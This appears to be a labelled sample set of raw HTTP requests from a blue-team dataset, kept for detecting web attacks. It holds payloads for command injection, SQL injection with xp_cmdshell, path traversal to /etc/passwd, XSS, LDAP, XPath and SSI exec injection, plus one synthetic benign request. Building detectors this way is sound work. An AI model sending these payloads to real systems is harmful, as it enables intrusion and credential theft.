@@ -1,0 +1,66 @@
+{
+  "source_dataset": "/root/Blueteam/data/final_clean_small_plus_cmdi.csv",
+  "selection_note": "Hard examples: shorter and still readable multivector / mixed-signal / less obvious cases. Up to 2 per attack type plus benign.",
+  "requests": [
+    {
+      "attack_type": "Command Injection",
+      "raw_request": "POST /admin/tools HTTP/1.1\r\nHost: intranet.local\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nname=; cat /etc/passwd&trace=1048"
+    },
+    {
+      "attack_type": "Command Injection",
+      "raw_request": "GET /lookup?ip=&& cat /etc/passwd HTTP/1.1\r\nHost: demo.local\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close"
+    },
+    {
+      "attack_type": "SQLi",
+      "raw_request": "GET /atsazntoriri/uJ/lg67.37aRD4Dwr_dm/Tvautoexec.exe?veiLvoovaxo=sxNmO&G_WTimgtetVRSC=as365&dmxo=s%5Dn&ny7amnnym=0472661307&5EkP=wsdeeq%28deletea&v6uo9qs=yuaasEcra&ae0=h-ar&ndnhBRNwt1lgmeo=189990159&byle0eynoqe=8ofnzsqnn&d1yjmhe5cc565=pdaey&EnsErtnT=iwjce9 HTTP/1.0\r\nHost: 145.211.105.76\r\nConnection: close\r\nAccept: application/zip\r\nAccept-Charset: *;q=0.2\r\nAccept-Encoding: \r\nAccept-Language: *\r\nCache-Control: bqoe='mjdatS'\r\nCookie: mxGL@MGl=';EXEC   master.dbo.xp_cmdshell     'cmd.exe\r\nDate: Thu, 05 Jun 08 03:22:07 CET\r\nFrom: sa6ceim@tohgie.fr\r\nIf-Unmodified-Since: Fri, 21 Sep 07 22:07:02 GMT\r\nIf-Match: \"fBcd3Xs@-oT8wxLU4C\"\r\nMax-Forwards: 269\r\nPragma: no-cache\r\nAuthorization: Digest cnonce=\"io3Eer\"\r\nRange: 194543-7,742178-6,7187-\r\nReferer: /ndhHR/racydnME.swf\r\nTrailer: If-None-Match\r\nUser-Agent: Mozilla/3.8 (X11; U; Linux i586 6.8; ew-In; rv:3.1.8) Gecko/48865278\r\nVia: 2.8 229.99.0.132, 6.8 www.sot4sfh.jpeg, 7.9 176.0.27.201\r\nX-Serial-Number: 04032727285571995188"
+    },
+    {
+      "attack_type": "SQLi",
+      "raw_request": "GET /jr/9mcIwp-55IBjy8/nx.jqbjtEFRoJ8/ge4eeia/reeeti0settHQ38gs/arSlabu7pK2v6/ehwdH.jsp?dttipepe=456548&svcl9asl=847675&YincludeOt_rB=bgsoundz%3Fr&-MsX=+niDHa&sf3=%27%3BEXEC+master.dbo.xp_cmdshell+%27cmd.exe&dni6sen8=eX_K&KftpMOO0iframeH=Dia%5Delo&trTes3oet0tdixc=oCU%40cQH6-kkc&fcrtidchfea2e=0&Phttpsft=%3EQ%3D8&so6g=5MU0e9VX HTTP/1.0\r\nHost: 29.0.31.147\r\nConnection: close\r\nAccept: image/*, application/*\r\nAccept-Charset: iso-8859-2;q=0.6\r\nAccept-Encoding: \r\nAccept-Language: deuqs9-invc;q=0.5, ioaaoa-u4a, orr-hh\r\nCache-Control: no-transform\r\nDate: Sun, 15 Jul 07 20:06:14 UTC\r\nETag: \"@Q2pOBJcB38UINBAlX\"\r\nExpect: 100-continue\r\nIf-Unmodified-Since: Sat, 04 Dec 04 14:00:33 CET\r\nIf-Match: *\r\nIf-Range: Fri, 12 Jun 09 11:36:48 GMT\r\nMax-Forwards: 6586\r\nPragma: no-cache\r\nAuthorization: ooeda eestum=adtm\r\nReferer: /bddee/asuOt4l/emasr.txt\r\nUser-Agent: Mozilla/0.9 (compatible; MSIE 0.0; Win98; sihs)\r\nVia: 3.8 19.239.68.151\r\nX-Serial-Number: 074180308\r\n----: ---------------------"
+    },
+    {
+      "attack_type": "Path Traversal",
+      "raw_request": "POST /login HTTP/1.1\r\nHost: app.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\nConnection: close\r\n\r\nfile=..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini&id=1993"
+    },
+    {
+      "attack_type": "Path Traversal",
+      "raw_request": "POST /comments HTTP/1.1\r\nHost: app.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 50\r\nConnection: close\r\n\r\nfile=%uff0e%uff0e\\%uff0e%uff0e\\/etc/passwd&id=2204"
+    },
+    {
+      "attack_type": "LDAP Injection",
+      "raw_request": "POST /profile HTTP/1.1\r\nHost: demo.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 66\r\nConnection: close\r\n\r\npath=Can be used in an injection like `*)(ATTRIBUTE_HERE=*&id=1134"
+    },
+    {
+      "attack_type": "LDAP Injection",
+      "raw_request": "POST /profile HTTP/1.1\r\nHost: app.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 70\r\nConnection: close\r\n\r\nredirect=Can be used in an injection like `*)(ATTRIBUTE_HERE=*&id=1047"
+    },
+    {
+      "attack_type": "XPath Injection",
+      "raw_request": "POST /auth HTTP/1.1\r\nHost: app.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\nConnection: close\r\n\r\nq=' and count(/@*)=1 and '1'='1&id=1288"
+    },
+    {
+      "attack_type": "XPath Injection",
+      "raw_request": "POST /login HTTP/1.1\r\nHost: intranet.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\nConnection: close\r\n\r\npath=' and count(/@*)=1 and '1'='1&id=1376"
+    },
+    {
+      "attack_type": "XSS",
+      "raw_request": "POST /search HTTP/1.1\r\nHost: app.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 54\r\nConnection: close\r\n\r\nq=java%09script:alert(1) - Horizontal tab (\\t)&id=2228"
+    },
+    {
+      "attack_type": "XSS",
+      "raw_request": "POST /comments HTTP/1.1\r\nHost: demo.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 51\r\nConnection: close\r\n\r\nname=<%<!--'%><script>alert(1);</script -->&id=2225"
+    },
+    {
+      "attack_type": "SSI",
+      "raw_request": "GET /api/items?redirect=<!--#include file=\"..\\..\\web.config\" --> HTTP/1.1\r\nHost: intranet.local\r\nUser-Agent: curl/8.0.1\r\nAccept: */*\r\nConnection: close"
+    },
+    {
+      "attack_type": "SSI",
+      "raw_request": "POST /auth HTTP/1.1\r\nHost: app.local\r\nUser-Agent: curl/8.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\nConnection: close\r\n\r\nsearch=<!--#exec cmd=\"whoami\" -->&id=1532"
+    },
+    {
+      "attack_type": "benign",
+      "raw_request": "GET /rt/oLu3Pwp-uD/tnuveieA1td/edieodJsnaayvtsgh/glTbQ/oqT@G./lou9a/omUq/9trIedf4eietqiIed.png?hlgEof6Rlfa5=v&teDolteuhsCee=mM34-%408x&ntenEbo0=a4aouwhcc0uhjo&cmsbwaHwoy8=8537772&YQr@RCc8tJ=4eRE46tsso&ddiR3nnr6x=scs2t&tD5ierircd=019034&XOnodeevalnechoLWe=aiooonbh&qra=ianxw3yovku&divViV-var=1&8easwod=tsnenolnif3nst&eawnpeaEea=wD5ie.Ce7eNj&Sra1baoa4htAV=10088713 HTTP/1.1\r\nHost: 6.81.36.189:13955\r\nConnection: close\r\nAccept-Charset: hz-gb-2312;q=0.8, windows-1252;q=0.7, euc-cn;q=0.3, cp-936, windows-1251\r\nAccept-Encoding: gzip, identity;q=0.2, gzip\r\nAccept-Language: oed6esb-ste1tni, fcUwu5-a, E-er, qokl-met;q=0.1\r\nCache-Control: only-if-cached\r\nCookie: 9ooincgft2muEl9=fuLiGhyste\r\nCookie2: $Version=\"156\"\r\nETag: W/\"1rGlZI2_N_SUdCE-Yj8\"\r\nFrom: n9mf@hcs9solg.ch\r\nIf-Range: *\r\nMax-Forwards: 17\r\nProxy-Authorization: tyho a4sceAie=eeAlad\r\nReferer: /ntoogD/rehis.jpg\r\nUser-Agent: Mozilla/5.5 (Windows; U; WinNT 3.1; g2-o5; rv:7.7.6) Gecko/92694168"
+    }
+  ]
+}
